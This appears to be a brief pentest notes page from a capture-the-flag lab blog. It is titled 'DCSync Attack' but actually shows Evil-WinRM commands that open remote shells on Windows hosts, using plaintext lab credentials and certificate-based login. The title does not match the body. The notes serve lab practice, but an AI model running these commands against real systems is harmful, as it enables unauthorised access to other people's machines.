---
description: >-
  DCSync Attack
title: DCSync Attack              # Add title here
date: 2023-02-06 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Lateral Movement]             # Change Templates to Writeup
tags: [active directory, lateral movement, evilwinrm]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Basic Access
Evil-WinRM to access via port tcp-5985 into a system:
```powershell
evil-winrm -i 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
```
Examples:
[[Forest#^b22389]]

### Active Directory Certificate Services
#Note We can extract the .cer and the .key from a .pfx as per the [[Legacy PFX certificate]] guide.
If we get a .cer certificate from the /certsrv endpoint on the DC website we can access to it as follows, for more info go to [[WinRM Certificate (password-less) based authentication]]:
```bash
evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```
Examples:
[Sizzle](https://shuciran.github.io/posts/Sizzle/#fnref:evil-winrm)
